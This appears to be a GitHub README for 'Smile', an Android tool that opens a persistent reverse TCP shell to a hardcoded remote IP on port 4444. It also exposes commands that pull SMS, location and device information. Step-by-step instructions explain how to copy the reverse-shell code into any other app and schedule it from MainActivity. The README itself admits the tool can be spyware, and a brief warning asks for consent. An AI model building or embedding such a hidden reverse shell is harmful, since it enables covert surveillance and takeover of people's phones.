<img width="2078" height="372" alt="image" src="https://github.com/user-attachments/assets/4cfdd815-e54d-43f3-bd71-6478c5609204" />

# Smile

An Android remote administration tool that allows a remote shell session to be obtained on the target device.

## Tools and Libraries
* **Socket.IO**
* **Coroutines**
* **WorkManager**
  
---

### How does it work?

When the app is started, it continuously attempts to establish a **reverse TCP connection** with its configured remote server. It attempts to make a connection every three seconds.

If the remote server is actively listening for incoming connections on its IP address, a successful connection is established, and the server obtains a **reverse TCP shell** on the target device.

Through this shell, the server can execute commands on the target device, essentially allowing it to run terminal commands remotely.

In addition to providing a shell, the server also has options to execute custom commands, such as:

* `getSms`
* `getLocation`
* `getDeviceInfo`
* `checkForRoot`

If the app process running on the target device is killed, a **WorkManager** task is started and attempts to establish a connection with the server again every five minutes.

WorkManager can make these connection attempts in the background without requiring the app's UI to be running. However, WorkManager is not designed to run indefinitely. After some time, Android may stop the background work, particularly when the system needs to conserve resources.

This can be an effective tool for **remote administration**, but the same capabilities can also be abused to create **spyware or a remote-access tool**.


### How to Integrate the Core Functionality into Your Own Application

The core functionality can be integrated into an Android application by adding the required components to the project's source code.

1. Copy the reverse_shell directory into your application's source code.

2. Open the RemoteServer file inside the reverse_shell directory and configure the appropriate server settings.
```
object RemoteServer {
  const val IPADDRESS = "172.174.235.121"
   const val PORT = 4444
 }
```
3. Initialize the required scheduler from your application's startup code. Add this in your MainActivity.
```Scheduler.scheduleReverseShellWorker(applicationContext)```

> [!WARNING]
> Security note: Any remote administration functionality should require explicit user consent, strong authentication, and appropriate access controls. Avoid implementing hidden or persistent remote shells in applications intended for general users.

### Screenshot
<img width="228" height="471" alt="image" src="https://github.com/user-attachments/assets/7d0cc920-7aa3-468c-882a-c4b855d3e1b3" />
